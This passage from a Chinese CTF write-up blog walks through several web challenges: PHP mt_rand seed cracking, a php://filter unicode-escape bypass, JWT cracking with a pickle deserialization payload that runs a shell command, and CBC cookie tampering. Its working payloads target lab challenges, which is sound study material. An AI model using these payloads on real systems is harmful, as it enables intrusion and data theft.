class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure><p>这是个经典的伪随机数问题，可以参考该文章：<a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/192012.html</a></p><p>将得到的部分字母还原成随机数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass_now = <span class="string">"W0dCwtjQ3A"</span>;</span><br><span class="line">$allowable_characters = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;</span><br><span class="line">$len = strlen($allowable_characters) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pass_now); $j++) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($pass_now[$j] == $allowable_characters[$i]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"$i $i 0 $len "</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破种子</p><p><img src="/2019/12/30/积累的一些web题目/3.png" alt=""></p><p>得到了在7.1版本下的种子，然后对完整的字符串进行还原，注意要在7.1版本下运行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">237387795</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $str;</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/4.png" alt=""></p><p>重点源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//query.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure><p>我们需要以<code>json</code>的格式传入想读的文件名，但存在<code>is_valid</code>函数进行安全检查，这里可使用unicode进行绕过，同时为了避免文件内容有拦截，可以进行编码，例如</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"page"</span>:<span class="string">"php\u003a//filter/convert.base64-encode/resource=/fl\u0061g"</span>&#125;</span><br></pre></td></tr></table></figure><p>在线转换</p><p><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><blockquote><p>考点：jwt伪造，pickle</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/11.png" alt=""></p><p>首先要我们购买<code>lv6</code>，开始寻找<code>lv6</code>所在页面，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://6664045a-dfa6-4a6c-9ffb-bb0cd3a6a5d2.node3.buuoj.cn/shop?page="</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">    url1 = url + str(i)</span><br><span class="line">    print(<span class="string">'================================='</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = s.get(url1)</span><br><span class="line">        print(html.status_code)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"lv6.png"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            print(url1)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'[-]ERROR'</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><p>发现在<code>181</code>页，购买时发现账户中的金额不足，抓包去修改折扣数值，将其改小一些，例如<code>0.0000001</code>，购买后提示我们不是<code>admin</code>，进而查看当前<code>cookie</code>，发现是<code>jwt</code>，拿出来爆破一下密钥</p><p><img src="/2019/12/30/积累的一些web题目/12.png" alt=""></p><p>将<code>cookie</code>替换，查看源码，给了源码泄露的地址，下载下来审计一下，发现了反序列化的点</p><p><img src="/2019/12/30/积累的一些web题目/13.png" alt="13"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#return (eval, ("open('/flag.txt','r').read()",))</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">"__import__('os').popen('cat /flag.txt').read()"</span>,))</span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/14.png" alt=""></p><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><blockquote><p>考点：伪随机数</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/34.jpg" alt="34"></p><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure><p>可以爆破伪随机数种子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'W0dCwtjQ3A'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/35.jpg" alt="35"></p><p>爆破出种子，然后生成对应的private_key</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// mt_srand(1775196155);</span></span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  $pri = private_key();</span><br><span class="line">  <span class="keyword">echo</span> $Public_key;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> $pri;</span><br></pre></td></tr></table></figure><p>然后用万能密码绕过拿到flag</p><p><img src="/2019/12/30/积累的一些web题目/36.jpg" alt="36"></p><h2 id="BSidesCF-2019-Mixer"><a href="#BSidesCF-2019-Mixer" class="headerlink" title="[BSidesCF 2019]Mixer"></a>[BSidesCF 2019]Mixer</h2><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/37.jpg" alt="37"></p><p>登陆后抓包，删掉cookie中user值的一位，出现如下报错</p><p><img src="/2019/12/30/积累的一些web题目/38.jpg" alt="38"></p><p>猜测是CBC加密，明文为如下格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"first_name"</span>:<span class="string">"aaa"</span>,<span class="attr">"last_name"</span>:<span class="string">"bbb"</span>,<span class="attr">"is_admin"</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><p>目标是将<code>is_admin</code>的值变成1</p><p>虽然我们不知道初始化向量的值，但是由于明文是16位一组，可以对明文进行填充，这里放上一张网上的图</p><p><img src="/2019/12/30/积累的一些web题目/39.jpg" alt="39"></p><p>最后将1.000000000000的值插入到倒数第二个密文块即可</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=e<span class="number">7</span>bad<span class="number">305</span>dcc<span class="number">721367</span>f<span class="number">5</span>d<span class="number">961</span>d<span class="number">63</span><span class="keyword">c</span><span class="number">3</span>d<span class="number">340</span>ca<span class="number">4</span>aab<span class="number">0</span>f<span class="number">874</span><span class="keyword">c</span><span class="number">635</span>b<span class="number">68388961</span>ef<span class="number">03</span>dbeb<span class="number">6</span>fe<span class="number">6</span>a<span class="number">8</span>eade<span class="number">0270198</span>a<span class="number">1</span>dc<span class="number">8524</span>d<span class="number">634</span>a<span class="number">8912</span>ca<span class="number">916102</span><span class="keyword">c</span><span class="number">524</span><span class="keyword">c</span><span class="number">31</span>daa<span class="number">8e088</span>dffc<span class="number">2</span>a<span class="number">8</span>ca<span class="number">4</span>aab<span class="number">0</span>f<span class="number">874</span><span class="keyword">c</span><span class="number">635</span>b<span class="number">68388961</span>ef<span class="number">03</span>dbeb<span class="number">8</span>d<span class="number">5</span>f<span class="number">5566</span>bef<span class="number">8</span>a<span class="number">2111</span>ee<span class="number">37728</span><span class="keyword">c</span><span class="number">651</span>b<span class="number">131</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/40.jpg" alt="40"></p><h2 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h2><blockquote><p>考点：undefsafe导致的原型链污染</p></blockquote><p><img src="/2019/12/30/积累的一些web题目/41.jpg" alt="41"></p><p>参考<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10795" target="_blank" rel="noopener">CVE-2019-10795</a>，当undefsafe小于2.0.3时，会存在原型链污染漏洞，题目代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.owner = <span class="string">"whoknows"</span>;</span><br><span class="line">        <span 